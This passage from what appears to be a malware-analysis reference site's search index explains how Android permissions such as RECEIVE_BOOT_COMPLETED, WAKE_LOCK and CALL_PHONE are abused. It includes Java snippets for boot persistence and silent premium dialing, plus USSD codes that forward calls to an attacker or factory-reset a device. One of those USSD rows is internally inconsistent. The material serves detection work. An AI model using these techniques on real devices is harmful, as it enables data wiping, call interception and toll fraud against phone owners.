Changes","text":"<p>Android 8.0 (API 26): background execution limits. Apps can no longer run services freely in the background. <code>startForegroundService()</code> introduced as the replacement.</p> <p>Android 9.0 (API 28): <code>FOREGROUND_SERVICE</code> permission required in manifest.</p> <p>Android 10 (API 29): foreground service types introduced.</p> <p>Android 12 (API 31): restrictions on starting foreground services from the background. Must use exact alarms, high-priority FCM, or user interaction to start.</p> <p>Android 14 (API 34): type-specific foreground service permissions enforced. <code>dataSync</code> type limited to 6 hours.</p>"},{"location":"permissions/normal/foreground-service/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\" /&gt;\n&lt;uses-permission android:name=\"android.permission.FOREGROUND_SERVICE_DATA_SYNC\" /&gt;\n</code></pre> <p>The <code>foregroundServiceType</code> in the service declaration reveals the claimed purpose. Mismatch between the declared type and actual app functionality is suspicious.</p>"},{"location":"permissions/normal/internet/","title":"INTERNET","text":"<p>Allows opening network sockets. Required by virtually all Android malware for C2 communication, data exfiltration, payload download, and inject kit retrieval. Granted silently at install time.</p>"},{"location":"permissions/normal/internet/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.INTERNET</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 1"},{"location":"permissions/normal/internet/#what-it-enables","title":"What It Enables","text":"<p>Full network access: HTTP/HTTPS requests, raw sockets, WebSocket connections, DNS queries. No restrictions on destination, port, or protocol.</p>"},{"location":"permissions/normal/internet/#relevance-to-malware","title":"Relevance to Malware","text":"<p>Every malware family that communicates with a remote server needs this permission. Without it, the malware is limited to local-only operations (which are rarely useful).</p> <p>Network functions in malware:</p> Function Usage C2 communication Receive commands, send status updates Data exfiltration Upload stolen credentials, SMS, contacts, files Payload download Fetch second-stage APKs, inject kits, configuration Inject kit retrieval Download HTML overlay templates per target app Screen streaming VNC-like remote access (Hook, Octo) Update mechanism Download updated versions of the malware"},{"location":"permissions/normal/internet/#detection-value","title":"Detection Value","text":"<p><code>INTERNET</code> alone is meaningless as an indicator since the vast majority of legitimate apps also request it. Its value is in combination: <code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> is a different story than <code>INTERNET</code> alone.</p>"},{"location":"permissions/normal/internet/#network-security-config","title":"Network Security Config","text":"<p>Apps can declare a network security configuration that controls TLS behavior:</p> <pre><code>&lt;!-- res/xml/network_security_config.xml --&gt;\n&lt;network-security-config&gt;\n    &lt;domain-config cleartextTrafficPermitted=\"true\"&gt;\n        &lt;domain includeSubdomains=\"true\"&gt;example.com&lt;/domain&gt;\n    &lt;/domain-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>When analyzing an app, this file reveals:</p> <ul> <li>Whether cleartext (HTTP) traffic is allowed (and to which domains)</li> <li>Custom certificate pins</li> <li>Trusted CA certificates (including user-installed certs)</li> <li>Debug-only trust overrides</li> </ul> <p>On Android 9+, cleartext traffic is blocked by default unless explicitly allowed in the network security config.</p>"},{"location":"permissions/normal/query-all-packages/","title":"QUERY_ALL_PACKAGES","text":"<p>Allows an app to see all installed packages on the device. Used by malware for reconnaissance: identifying installed banking apps (to prepare overlays), detecting security software (to avoid or disable it), and fingerprinting the device.</p>"},{"location":"permissions/normal/query-all-packages/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.QUERY_ALL_PACKAGES</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 30 (Android 11) <p>Before Android 11, all apps could freely enumerate installed packages using <code>PackageManager.getInstalledPackages()</code>. Android 11 introduced package visibility filtering: by default, apps can only see a limited set of other apps.</p>"},{"location":"permissions/normal/query-all-packages/#what-it-enables","title":"What It Enables","text":"<p>With this permission, <code>PackageManager.getInstalledPackages()</code> returns the full list of installed apps. Without it, only apps matching the declaring app's <code>&lt;queries&gt;</code> manifest element or meeting automatic visibility criteria are returned.</p> <p>Apps can also use targeted <code>&lt;queries&gt;</code> elements instead of this broad permission:</p> <pre><code>&lt;queries&gt;\n    &lt;package android:name=\"com.target.banking.app\" /&gt;\n&lt;/queries&gt;\n</code></pre>"},{"location":"permissions/normal/query-all-packages/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/query-all-packages/#target-list-matching","title":"Target List Matching","text":"<p>Banking trojans use installed app enumeration to determine which overlay injections to download from C2. Instead of downloading templates for all 500+ supported banks, the malware only fetches overlays for apps actually installed on the device.</p>"},{"location":"permissions/normal/query-all-packages/#security-software-detection","title":"Security Software Detection","text":"<p>Malware checks for the presence of antivirus, MDM, and security analysis tools:</p> Package Pattern Tool <code>com.avast.*</code>, <code>com.avg.*</code> Avast/AVG antivirus <code>com.bitdefender.*</code> Bitdefender <code>org.malwarebytes.*</code> Malwarebytes <code>com.lookout.*</code> Lookout <code>de.robv.android.xposed.*</code> Xposed framework <code>eu.faircode.netguard</code> NetGuard firewall <p>If detected, malware may avoid activating, attempt to uninstall the tool (via accessibility), or warn the C2 operator.</p>"},{"location":"permissions/normal/query-all-packages/#environment-detection","title":"Environment Detection","text":"<p>Checking for analysis environment indicators:</p> Package Indicates <code>com.android.vending</code> absent Non-standard ROM or emulator <code>com.google.android.gms</code> absent No Google Play Services Common emulator packages Automated analysis sandbox"},{"location":"permissions/normal/query-all-packages/#targeted-queries-alternative","title":"Targeted <code>&lt;queries&gt;</code> Alternative","text":"<p>Sophisticated malware avoids <code>QUERY_ALL_PACKAGES</code> (which triggers Play Store review scrutiny) and instead lists target packages in <code>&lt;queries&gt;</code>:</p> <pre><code>&lt;queries&gt;\n    &lt;package android:name=\"com.chase.sig.android\" /&gt;\n    &lt;package android:name=\"com.bankofamerica.cashpromobile\" /&gt;\n    &lt;package android:name=\"com.wells.fargo.mobile\" /&gt;\n&lt;/queries&gt;\n</code></pre> <p>This is less conspicuous but reveals the target list in the manifest.</p>"},{"location":"permissions/normal/query-all-packages/#android-version-changes","title":"Android Version Changes","text":"<p>Android 11 (API 30): package visibility filtering introduced. <code>QUERY_ALL_PACKAGES</code> added as the opt-out.</p> <p>Android 11+: Google Play policy restricts use of <code>QUERY_ALL_PACKAGES</code> to apps where core functionality requires it (e.g., launchers, device managers, security apps). Apps that don't justify it face rejection.</p>"},{"location":"permissions/normal/query-all-packages/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.QUERY_ALL_PACKAGES\" /&gt;\n</code></pre> <p>Or check for extensive <code>&lt;queries&gt;</code> entries listing banking/financial apps, which reveals targeting intent without needing the broad permission.</p>"},{"location":"permissions/normal/receive-boot-completed/","title":"RECEIVE_BOOT_COMPLETED","text":"<p>Allows an app to receive the <code>ACTION_BOOT_COMPLETED</code> broadcast after the device finishes booting. The primary persistence mechanism for Android malware: register a receiver, get started on every reboot without user interaction.</p>"},{"location":"permissions/normal/receive-boot-completed/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_BOOT_COMPLETED</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 1 <p>Normal protection level means no user prompt, no settings toggle. Granted silently.</p>"},{"location":"permissions/normal/receive-boot-completed/#what-it-enables","title":"What It Enables","text":"<p>The app registers a <code>BroadcastReceiver</code> for <code>ACTION_BOOT_COMPLETED</code>. After device boot, the system sends this broadcast to all registered receivers. The receiver can then start a service, schedule alarms, or begin any background operation.</p> <pre><code>public class BootReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {\n            context.startForegroundService(new Intent(context, MalwareService.class));\n        }\n    }\n}\n</code></pre> <p>Manifest registration:</p> <pre><code>&lt;receiver android:name=\".BootReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre>"},{"location":"permissions/normal/receive-boot-completed/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Virtually every persistent Android malware uses this permission. Without it, the malware would stop running after a reboot, requiring the user to re-launch it.</p> <p>Combined with <code>FOREGROUND_SERVICE</code>, the boot receiver starts a persistent foreground service that maintains C2 connections, monitors for target apps, and keeps the malware operational.</p>"},{"location":"permissions/normal/receive-boot-completed/#related-broadcasts","title":"Related Broadcasts","text":"<p>Malware often registers for additional boot-like broadcasts for redundancy:</p> Broadcast When Fired <code>ACTION_BOOT_COMPLETED</code> After full system boot <code>ACTION_LOCKED_BOOT_COMPLETED</code> After direct boot (before user unlock, API 24+) <code>ACTION_MY_PACKAGE_REPLACED</code> After app is updated <code>ACTION_PACKAGE_REPLACED</code> After any package is updated"},{"location":"permissions/normal/receive-boot-completed/#notable-families","title":"Notable Families","text":"Family Boot Persistence Usage Cerberus Boot receiver restarts overlay monitoring and C2 service Hook Boot persistence for VNC-based remote access and overlay engine GodFather Registers boot receiver to restart accessibility-based monitoring Octo Boot-triggered service for screen streaming and keylogging Medusa Boot persistence for screen recording and remote access Hydra Boot receiver re-establishes C2 connection and overlay injection SharkBot Boot persistence for ATS fraud engine and credential interception SpyNote Boot receiver ensures persistent RAT functionality across reboots Rafel RAT Boot persistence for remote access, SMS interception, and ransomware"},{"location":"permissions/normal/receive-boot-completed/#android-version-changes","title":"Android Version Changes","text":"<p>Android 3.1 (API 12): apps in \"stopped state\" (freshly installed, never opened) do not receive <code>BOOT_COMPLETED</code>. The user must launch the app at least once. This prevents malware from activating purely through installation, but all sideloading-based attacks involve social engineering to open the app anyway.</p> <p>Android 8.0 (API 26): background execution limits. <code>BOOT_COMPLETED</code> receivers still work, but they cannot start background services directly. Must use <code>startForegroundService()</code> instead.</p> <p>Android 13 (API 33): <code>FOREGROUND_SERVICE</code> types must be declared. Malware must specify what foreground service type to use.</p>"},{"location":"permissions/normal/receive-boot-completed/#detection","title":"Detection","text":"<p>The permission itself is common in legitimate apps (alarm clocks, messaging apps, etc.), so its presence alone is not suspicious. Combined with <code>INTERNET</code>, <code>FOREGROUND_SERVICE</code>, and sensitive permissions like <code>READ_SMS</code> or <code>BIND_ACCESSIBILITY_SERVICE</code>, it indicates persistence infrastructure.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/","title":"REQUEST_IGNORE_BATTERY_OPTIMIZATIONS","text":"<p>Allows requesting exemption from Android's battery optimization (Doze mode). When granted, the app's background processes are not restricted by the system, allowing persistent operation. Used by malware to maintain C2 connections and background monitoring without being killed by the OS.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> Protection Level <code>normal</code> Grant Method Automatically at install time (to request), user confirms via dialog Introduced API 23 (Android 6.0) <p>The permission allows the app to show a system dialog asking the user to whitelist it from battery optimization. The user must confirm.</p> <pre><code>Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);\nintent.setData(Uri.parse(\"package:\" + getPackageName()));\nstartActivity(intent);\n</code></pre>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/request-ignore-battery-optimizations/#persistence","title":"Persistence","text":"<p>Battery optimization (Doze mode) kills background processes to save battery. Malware needs to stay alive for:</p> <ul> <li>Maintaining C2 connections</li> <li>Monitoring for target apps (overlay timing)</li> <li>SMS interception</li> <li>Continuous data exfiltration</li> </ul> <p>Without this exemption, the OS may kill the malware's background service after minutes of inactivity.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#social-engineering","title":"Social Engineering","text":"<p>Malware presents fake dialogs before the system prompt: \"This app requires battery optimization disabled to function properly.\" The user sees the malware's explanation, then the system dialog, and clicks \"Allow.\"</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): Doze mode introduced. This permission added.</p> <p>Android 7.0 (API 24): Doze mode becomes more aggressive (activates even when device is moving).</p> <p>Android 13+: Google Play restricts apps that request this without justification.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\" /&gt;\n</code></pre> <p>Combined with <code>RECEIVE_BOOT_COMPLETED</code>, <code>FOREGROUND_SERVICE</code>, and <code>INTERNET</code>, this completes a persistence stack: boot start, foreground service, battery exemption, network access.</p>"},{"location":"permissions/normal/wake-lock/","title":"WAKE_LOCK","text":"<p>Allows preventing the CPU from sleeping. Used by malware to ensure background operations complete without the device entering deep sleep, particularly during data exfiltration, C2 polling, or on-device fraud operations.</p>"},{"location":"permissions/normal/wake-lock/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WAKE_LOCK</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 1"},{"location":"permissions/normal/wake-lock/#what-it-enables","title":"What It Enables","text":"<pre><code>PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);\nPowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"malware:wakelock\");\nwl.acquire();\n</code></pre> <p>Wake lock types:</p> Type Keeps On <code>PARTIAL_WAKE_LOCK</code> CPU only (screen off, keyboard off) <code>SCREEN_DIM_WAKE_LOCK</code> CPU + screen dim (deprecated API 17) <code>SCREEN_BRIGHT_WAKE_LOCK</code> CPU + screen bright (deprecated API 17) <code>FULL_WAKE_LOCK</code> CPU + screen + keyboard (deprecated API 17) <p><code>PARTIAL_WAKE_LOCK</code> is the only non-deprecated type and the one malware uses: it keeps the CPU running while the screen stays off, so the user doesn't notice.</p>"},{"location":"permissions/normal/wake-lock/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/wake-lock/#background-operation-completion","title":"Background Operation Completion","text":"<p>Ensure long-running tasks complete:</p> <ul> <li>Large data uploads (contact database, SMS history, file exfiltration)</li> <li>Screen recording and streaming</li> <li>Cryptocurrency mining (rare on mobile)</li> <li>ATS fraud sequences that take multiple steps</li> </ul>"},{"location":"permissions/normal/wake-lock/#supporting-role","title":"Supporting Role","text":"<p><code>WAKE_LOCK</code> is a supporting permission. It rarely appears alone. Combined with <code>FOREGROUND_SERVICE</code>, <code>RECEIVE_BOOT_COMPLETED</code>, and <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code>, it forms the complete persistence and background execution stack.</p>"},{"location":"permissions/normal/wake-lock/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WAKE_LOCK\" /&gt;\n</code></pre> <p>Extremely common in legitimate apps (messaging, media, alarm). Not a useful indicator alone. Value is in combination with other persistence and exfiltration permissions.</p>"},{"location":"permissions/phone/","title":"Phone Permissions","text":"<p>Phone permissions expose telephony state, hardware identifiers, and call control. This group leaks IMEI, IMSI, carrier info, and phone number. It also enables initiating calls, answering inbound calls, and managing voicemail and SIP sessions without user interaction.</p> <p>Before Android 10, <code>READ_PHONE_STATE</code> alone was enough to harvest persistent device identifiers. Combined with <code>CALL_PHONE</code>, malware can dial premium numbers or execute USSD codes that modify carrier settings, drain prepaid balance, or forward calls to attacker-controlled numbers.</p>"},{"location":"permissions/phone/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_PHONE_STATE IMEI/IMSI harvesting, device fingerprinting, call state monitoring READ_PHONE_NUMBERS Victim phone number extraction for account linking CALL_PHONE Premium number dialing, USSD code execution, call fraud ANSWER_PHONE_CALLS Intercept incoming calls, auto-answer for eavesdropping ADD_VOICEMAIL Inject voicemail entries, social engineering via fake messages USE_SIP SIP-based call interception, VoIP abuse ACCEPT_HANDOVER Hijack ongoing calls from one app to another"},{"location":"permissions/phone/#play-store-policy","title":"Play Store Policy","text":"<p>Google restricts phone and call log permissions under the same policy as SMS (January 2019). Apps must be declared as the default dialer or phone handler, or demonstrate an approved core use case. This restriction pushed identifier-harvesting malware toward sideloading and alternative distribution channels.</p>"},{"location":"permissions/phone/#common-combinations","title":"Common Combinations","text":"Combo Purpose <code>READ_PHONE_STATE</code> + <code>INTERNET</code> Device fingerprint exfiltration <code>CALL_PHONE</code> + <code>READ_CONTACTS</code> Automated calls to victim's contact list <code>READ_PHONE_STATE</code> + <code>READ_SMS</code> + <code>RECEIVE_SMS</code> Full telephony surveillance with OTP interception <code>ANSWER_PHONE_CALLS</code> + <code>RECORD_AUDIO</code> Call interception with recording"},{"location":"permissions/phone/#families-by-phone-permission-abuse","title":"Families by Phone Permission Abuse","text":"Family Primary Phone Permissions Technique Fakecalls <code>CALL_PHONE</code>, <code>ANSWER_PHONE_CALLS</code> Banking trojan that intercepts outbound calls to bank customer service numbers. When the victim dials their bank, the malware drops the real call and connects to an attacker-operated call center instead. Also auto-answers inbound calls from the attacker to deliver vishing scripts. SpyNote (CypherRat) <code>READ_PHONE_STATE</code> Device fingerprinting via IMEI, IMSI, and carrier info. Uses telephony identifiers to track victims across reinstalls and associate stolen data with specific devices. BRATA <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code> Dials premium numbers for revenue, reads phone state to detect active calls and avoid interrupting ongoing conversations that might alert the victim. Cerberus <code>READ_PHONE_STATE</code>, <code>CALL_PHONE</code> Harvests device identifiers for victim tracking, can initiate calls to premium numbers. Pegasus <code>READ_PHONE_STATE</code>, <code>ANSWER_PHONE_CALLS</code> Full telephony surveillance -- harvests all identifiers, monitors call state, and can silently answer calls for ambient listening."},{"location":"permissions/phone/#ussd-code-execution-via-call_phone","title":"USSD Code Execution via CALL_PHONE","text":"<p><code>CALL_PHONE</code> is not limited to voice calls. It can dial USSD (Unstructured Supplementary Service Data) codes that execute carrier-side commands without any user interaction beyond the initial permission grant:</p> USSD Pattern Effect <code>tel:*%2321%23</code> (<code>*#*#</code>) Factory reset on some devices -- wipes all user data <code>tel:**21*[number]%23</code> Unconditional call forwarding -- redirects all incoming calls to attacker's number <code>tel:**62*[number]%23</code> Forward on not reachable -- catches calls when victim's phone is off or out of range <code>tel:*%23*%23</code> prefixed codes Various device/carrier diagnostic and configuration commands <p>Call forwarding via USSD is particularly dangerous in financial fraud. The attacker forwards the victim's calls to their own number, then initiates a password reset on the victim's bank account. When the bank calls to verify, the attacker answers and confirms the reset. The victim never sees the incoming call.</p>"},{"location":"permissions/phone/#imei-harvesting-deprecation","title":"IMEI Harvesting Deprecation","text":"<p>Android 10 (API 29) was a turning point for device fingerprinting. <code>getDeviceId()</code>, <code>getImei()</code>, and <code>getSimSerialNumber()</code> now return <code>null</code> for apps targeting API 29+ unless the app holds <code>READ_PRIVILEGED_PHONE_STATE</code>, a signature-level permission reserved for system apps.</p> <p>Malware families adapted with alternative identifiers:</p> Identifier Access Method Persistence <code>ANDROID_ID</code> <code>Settings.Secure</code> -- no permission needed Resets on factory reset, unique per app signing key Google Advertising ID Play Services API -- no permission needed User-resettable, but most users never reset it <code>Build.SERIAL</code> Deprecated in API 26, requires <code>READ_PHONE_STATE</code> in 26-28, inaccessible in 29+ Persistent across resets on some devices Hardware MAC Randomized since Android 10 for Wi-Fi scans Unreliable for tracking <code>MediaDrm</code> device ID <code>MediaDrm</code> API -- no permission needed Persistent, hard to reset, widely used by modern malware <p>The <code>MediaDrm</code> Widevine device ID has become the preferred fingerprint for post-Android 10 malware. It requires no permissions, survives app reinstalls, and is consistent across apps on the same device.</p>"},{"location":"permissions/phone/accept-handover/","title":"ACCEPT_HANDOVER","text":"<p>Allows an app to accept a call handover from another calling app. Part of the telecom framework for transferring active calls between different calling apps or from a cellular call to a VoIP app.</p>"},{"location":"permissions/phone/accept-handover/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCEPT_HANDOVER</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 28 (Android 9.0)"},{"location":"permissions/phone/accept-handover/#what-it-enables","title":"What It Enables","text":"<p>Accept incoming call handovers via <code>TelecomManager</code>. Used when a user wants to transfer a cellular call to a Wi-Fi calling or VoIP app.</p>"},{"location":"permissions/phone/accept-handover/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Minimal. Could theoretically intercept call handovers to redirect calls, but this requires specific telecom conditions and is not observed in practice.</p>"},{"location":"permissions/phone/accept-handover/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCEPT_HANDOVER\" /&gt;\n</code></pre> <p>Only expected in calling/telecom apps.</p>"},{"location":"permissions/phone/add-voicemail/","title":"ADD_VOICEMAIL","text":"<p>Allows adding voicemail messages to the device's voicemail content provider. Minimal security relevance.</p>"},{"location":"permissions/phone/add-voicemail/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ADD_VOICEMAIL</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 14 (Android 4.0)"},{"location":"permissions/phone/add-voicemail/#what-it-enables","title":"What It Enables","text":"<p>Insert voicemail entries into the <code>VoicemailContract</code> content provider. Used by visual voicemail apps and carrier voicemail services.</p>"},{"location":"permissions/phone/add-voicemail/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Limited abuse potential. Could theoretically inject fake voicemail messages for social engineering, but this is not observed in practice.</p>"},{"location":"permissions/phone/add-voicemail/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ADD_VOICEMAIL\" /&gt;\n</code></pre> <p>Only expected in dialer and carrier voicemail apps.</p>"},{"location":"permissions/phone/answer-phone-calls/","title":"ANSWER_PHONE_CALLS","text":"<p>Allows programmatically answering incoming phone calls. Can be used to silently answer calls from specific numbers (e.g., from a C2 operator) or to intercept calls.</p>"},{"location":"permissions/phone/answer-phone-calls/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ANSWER_PHONE_CALLS</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 26 (Android 8.0)"},{"location":"permissions/phone/answer-phone-calls/#what-it-enables","title":"What It Enables","text":"<pre><code>TelecomManager tm = (TelecomManager) getSystemService(TELECOM_SERVICE);\ntm.acceptRingingCall();\n</code></pre> <p>Auto-answers the currently ringing call. Combined with audio recording, enables call wiretapping.</p>"},{"location":"permissions/phone/answer-phone-calls/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/answer-phone-calls/#call-wiretapping","title":"Call Wiretapping","text":"<p>Auto-answer incoming calls from the attacker's number, activate speakerphone, and record the ambient audio. The device becomes a remote listening device activated by calling it.</p>"},{"location":"permissions/phone/answer-phone-calls/#call-interception","title":"Call Interception","text":"<p>Answer calls before the user can, potentially to intercept voice-based verification calls from banks.</p>"},{"location":"permissions/phone/answer-phone-calls/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ANSWER_PHONE_CALLS\" /&gt;\n</code></pre> <p>Expected in dialer and call management apps only. Suspicious in any other context.</p>"},{"location":"permissions/phone/call-phone/","title":"CALL_PHONE","text":"<p>Allows initiating phone calls programmatically without passing through the dialer UI. The call begins immediately with no user confirmation. Used by malware for premium-rate number fraud, USSD code execution that can modify carrier settings or drain prepaid balance, and as a revenue channel in early Android malware families.</p>"},{"location":"permissions/phone/call-phone/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.CALL_PHONE</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/phone/call-phone/#what-it-enables","title":"What It Enables","text":"<p>Direct call initiation via <code>ACTION_CALL</code> intent:</p> <pre><code>Intent callIntent = new Intent(Intent.ACTION_CALL);\ncallIntent.setData(Uri.parse(\"tel:+19001234567\"));\nstartActivity(callIntent);\n</code></pre> <p>The key distinction from <code>ACTION_DIAL</code> (which requires no permission) is that <code>ACTION_CALL</code> skips the dialer screen entirely. The call connects immediately.</p> <p>USSD code execution works through the same mechanism:</p> <pre><code>Intent ussdIntent = new Intent(Intent.ACTION_CALL);\nussdIntent.setData(Uri.parse(\"tel:%23%2306%23\"));\nstartActivity(ussdIntent);\n</code></pre> <p>USSD codes are encoded as URI-escaped dial strings. The <code>#</code> character becomes <code>%23</code>, <code>*</code> becomes <code>%2A</code>.</p> USSD Code Effect <code>*#06#</code> Display IMEI <code>**21*[number]#</code> Enable unconditional call forwarding <code>##002#</code> Disable all call forwarding <code>*100#</code> Check prepaid balance (carrier-dependent) <code>*99#</code> Subscribe to premium service (carrier-dependent) <p>Starting API 26, <code>TelephonyManager.sendUssdRequest()</code> provides a programmatic USSD API with callback, giving malware structured access to USSD responses without parsing screen content.</p>"},{"location":"permissions/phone/call-phone/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/call-phone/#premium-number-fraud","title":"Premium Number Fraud","text":"<p>The original Android malware monetization model. Malware dials premium-rate numbers (typically international or short codes) that charge per-minute or per-call fees. Revenue splits between the premium number operator and the attacker.</p> <p>The attack runs in the background or at night when the user is unlikely to notice. Some families mute the device audio before dialing and restore volume after hanging up.</p>"},{"location":"permissions/phone/call-phone/#ussd-exploitation","title":"USSD Exploitation","text":"<p>USSD codes interact directly with the carrier network. Malware uses them to:</p> <ul> <li>Forward calls: redirect all incoming calls to an attacker number, enabling interception of voice-based OTPs and authentication callbacks</li> <li>Drain balance: execute carrier-specific USSD codes that purchase premium services or transfer prepaid credit</li> <li>Wipe device: on older Samsung devices, the USSD code <code>*2767*3855#</code> triggered a factory reset when processed through the dialer. This was demonstrated in 2012 by Ravi Borgaonkar and patched, but showed the destructive potential</li> </ul>"},{"location":"permissions/phone/call-phone/#call-forwarding-hijack","title":"Call Forwarding Hijack","text":"<p>Setting up unconditional call forwarding via <code>**21*[attacker_number]#</code> redirects all incoming calls to the attacker. This intercepts:</p> <ul> <li>Bank callback verification calls</li> <li>Voice OTPs read by automated systems</li> <li>Two-factor authentication phone calls</li> <li>Calls from contacts (social engineering potential)</li> </ul> <p>The victim's phone never rings. Combined with SMS forwarding, this provides complete telephony interception.</p>"},{"location":"permissions/phone/call-phone/#revenue-generation-comparison","title":"Revenue Generation Comparison","text":"Method Era Revenue per Device Premium call fraud 2010-2014 $5-50/month Premium SMS fraud 2010-2016 $1-10/message Banking trojan (ATS) 2018-present $500-50,000/device Ad fraud 2015-present $0.01-1/day <p>Premium call fraud has largely been replaced by banking trojans, but still appears in malware targeting regions with weak carrier protections.</p>"},{"location":"permissions/phone/call-phone/#notable-families","title":"Notable Families","text":"Family Call Abuse GoldDream (2011) One of the first to combine call initiation with SMS fraud RuFraud Premium number dialing targeting Russian carriers Android.Trojan.MMarketPay Automated premium service subscription via calls FakePlayer Premium SMS/call hybrid fraud Acecard Call forwarding setup to intercept bank verification calls Svpeng USSD-based balance drain on Russian carriers"},{"location":"permissions/phone/call-phone/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>CALL_PHONE</code> introduced with no runtime check. Manifest declaration was sufficient.</p> <p>Android 6.0 (API 23): runtime permission required. Users must explicitly grant the PHONE permission group.</p> <p>Android 6.0: Google also patched the USSD factory reset vector for stock Android. USSD codes from intents are now shown in the dialer rather than executed directly for certain dangerous codes.</p> <p>Android 8.0 (API 26): <code>TelephonyManager.sendUssdRequest()</code> added, providing a proper API for USSD with callbacks. Requires <code>CALL_PHONE</code> permission.</p> <p>Android 10 (API 29): background activity launch restrictions. Apps cannot start <code>ACTION_CALL</code> from the background unless they have a foreground service or are in the foreground. This limits silent premium dialing.</p> <p>Google Play 2019: <code>CALL_PHONE</code> restricted to apps declared as default dialer/phone handler or with approved use cases.</p>"},{"location":"permissions/phone/call-phone/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.CALL_PHONE\" /&gt;\n</code></pre> <p>Look for <code>ACTION_CALL</code> intents in code (not <code>ACTION_DIAL</code>, which is benign). Hardcoded phone numbers, especially premium-rate prefixes or USSD patterns, are strong indicators. <code>tel:</code> URI strings with encoded USSD characters (<code>%23</code>, <code>%2A</code>) in the decompiled code point to carrier manipulation.</p> <p>Combined with <code>MODIFY_AUDIO_SETTINGS</code> (to mute during calls) and <code>RECEIVE_BOOT_COMPLETED</code> (to schedule calls), this strongly suggests automated call fraud.</p>"},{"location":"permissions/phone/read-phone-numbers/","title":"READ_PHONE_NUMBERS","text":"<p>Allows reading the device's own phone numbers (line numbers for all SIMs). Introduced in Android 8 as a less invasive alternative to <code>READ_PHONE_STATE</code> for apps that only need the phone number.</p>"},{"location":"permissions/phone/read-phone-numbers/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_PHONE_NUMBERS</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 26 (Android 8.0)"},{"location":"permissions/phone/read-phone-numbers/#what-it-enables","title":"What It Enables","text":"<pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\nString phoneNumber = tm.getLine1Number();\n</code></pre> <p>Returns the phone number(s) associated with the device's SIM card(s). Note: this is not always populated, depending on the carrier and SIM configuration.</p>"},{"location":"permissions/phone/read-phone-numbers/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/read-phone-numbers/#device-identification","title":"Device Identification","text":"<p>The phone number serves as a persistent identifier for the victim. Malware sends this to C2 during initial registration to uniquely identify the infected device and enable targeted operations (e.g., sending SMS-based C2 commands to this number).</p>"},{"location":"permissions/phone/read-phone-numbers/#account-correlation","title":"Account 